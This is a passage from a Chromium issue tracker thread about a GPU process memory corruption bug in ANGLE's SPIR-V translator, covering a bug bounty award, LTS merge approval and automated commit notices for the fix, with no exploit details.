Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2024-04-22)

Congratulations! The Chrome VRP Panel has decided to award you $15,000 for this report of GPU process memory corruption + $1,000 bisect bonus. Thank you for your efforts in discovering and reporting this issue to us -- nice work!

### pe...@google.com (2024-04-22)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



### vo...@google.com (2024-04-22)

1. <https://crrev.com/c/5466390>
2. Low - simple change, no conflicts
3. M124
4. Yes

### dg...@google.com (2024-04-22)

Merge approved for M123. Note, this is for M123 Stable ChromeOS back port to meet security SLO.

### ap...@google.com (2024-04-22)

Project: angle/angle
Branch: chromium/6312

commit ba3b4e239620c95792e7d23c2975be4ab26d153e
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date:   Mon Apr 08 10:14:45 2024

    M123: SPIR-V: Fix const constructors with single scalar
    
    These constructors may be generated because of
    RemoveArrayLengthTraverser.
    
    Bug: chromium:332546345
    Change-Id: I2b2bf3728ef5bae148abc2a8518f8f3f42850025
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5462388
    (cherry picked from commit 0b776d32f69a932acb61963d9daad9e13f610944)
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5473406
    Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>
    Reviewed-by: Geoff Lang <geofflang@chromium.org>
    Reviewed-by: Daniel Gagnon <dgagnon@google.com>

M       src/compiler/translator/Compiler.cpp
M       src/compiler/translator/spirv/OutputSPIRV.cpp
M       src/tests/gl_tests/GLSLTest.cpp

https://chromium-review.googlesource.com/5473406


### ap...@google.com (2024-04-22)

Project: angle/angle
Branch: chromium/6099

commit 31db4b4b4d4ed8f77df10ad5e6db0c56e0fd4773
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date:   Mon Apr 08 10:14:45 2024

    [M120-LTS] SPIR-V: Fix const constructors with single scalar
    
    These constructors may be generated because of
    RemoveArrayLengthTraverser.
    
    Bug: chromium:332546345
    Change-Id: I2b2bf3728ef5bae148abc2a8518f8f3f42850025
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5462388
    (cherry picked from commit 0b776d32f69a932acb61963d9daad9e13f610944)
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5466390
    Commit-Queue: Zakhar Voit <voit@google.com>
    Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>
    Reviewed-by: Geoff Lang <geofflang@chromium.org>

M       src/compiler/translator/Compiler.cpp
M       src/compiler/translator/spirv/OutputSPIRV.cpp
M       src/tests/gl_tests/GLSLTest.cpp

https://chromium-review.googlesource.com/5466390


### ap...@google.com (2024-04-22)

Project: angle/angle
Branch: chromium/6312

commit ba3b4e239620c95792e7d23c2975be4ab26d153e
Author: Shahbaz Youssefi <syoussefi@chromium.org>
Date:   Mon Apr 08 10:14:45 2024

    M123: SPIR-V: Fix const constructors with single scalar
    
    These constructors may be generated because of
    RemoveArrayLengthTraverser.
    
    Bug: chromium:332546345
    Change-Id: I2b2bf3728ef5bae148abc2a8518f8f3f42850025
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5462388
    (cherry picked from commit 0b776d32f69a932acb61963d9daad9e13f610944)
    Reviewed-on: https://chromium-review.googlesource.com/c/angle/angle/+/5473406
    Reviewed-by: Shahbaz Youssefi <syoussefi@chromium.org>
    Reviewed-by: Geoff Lang <geofflang@chromium.org>
    Reviewed-by: Daniel Gagnon <dgagnon@google.com>

M       src/compiler/translator/Compiler.cpp
M       src/compiler/translator/spirv/OutputSPIRV.cpp
M       src/tests/gl_tests/GLSLTest.cpp

https://chromium-review.googlesource.com/5473406


### pe...@google.com (2024-07-17)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/332546345)*
